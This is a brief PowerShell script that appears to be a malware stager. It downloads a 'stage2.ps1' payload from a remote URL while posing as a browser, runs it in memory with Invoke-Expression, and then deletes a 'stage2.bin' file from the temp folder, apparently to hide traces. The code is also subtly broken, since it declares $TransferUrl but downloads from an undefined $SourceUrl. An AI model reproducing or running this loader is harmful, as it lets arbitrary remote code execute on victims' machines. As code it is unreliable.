[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://example.net/stage2.ps1',
    [int]$StageTimeout = 161
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$PayloadText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $PayloadText.Length)
Invoke-Expression $PayloadText

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Set-Location -Path $env:TEMP
